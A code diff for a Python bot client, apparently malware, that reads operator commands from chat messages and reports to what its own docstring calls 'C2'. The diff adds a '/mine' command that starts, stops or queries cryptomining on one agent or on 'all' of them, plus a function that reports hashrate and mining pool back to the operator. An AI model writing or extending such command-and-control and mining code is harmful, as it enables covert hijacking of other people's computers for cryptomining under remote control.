@@ -113,7 +113,7 @@ Result: {json.dumps(result_data)[:500]}"""
             text = message.get("text", "")
             
             # Parse commands from messages
-            # Format: /cmd <agent_id> <command>
+            # Format: /cmd <agent_id> <command> [data]
             if text.startswith("/cmd"):
                 parts = text.split(maxsplit=3)
                 if len(parts) >= 3:
@@ -125,8 +125,30 @@ Result: {json.dumps(result_data)[:500]}"""
                             "type": cmd,
                             "data": json.loads(cmd_data) if cmd_data.startswith("{") else {"args": cmd_data}
                         })
+            
+            # Mining control: /mine <agent_id> <start|stop|status>
+            elif text.startswith("/mine"):
+                parts = text.split(maxsplit=3)
+                if len(parts) >= 3:
+                    target_agent = parts[1]
+                    if target_agent == self.agent_id or target_agent == "all":
+                        action = parts[2] if len(parts) > 2 else "status"
+                        commands.append({
+                            "type": "mining",
+                            "data": {"action": action}
+                        })
         
         return commands
+    
+    def send_mining_status(self, is_mining, hashrate=0, pool=""):
+        """Send mining status update"""
+        status = "🟢 MINING" if is_mining else "🔴 STOPPED"
+        msg = f"""⛏ MINING STATUS: {self.agent_id}
+{status}
+Hashrate: {hashrate} H/s
+Pool: {pool or 'N/A'}
+Time: {time.strftime('%H:%M:%S')}"""
+        return self.send_message(msg)
     
     def send_output(self, output_type, content):
         """Send output/logs to C2"""
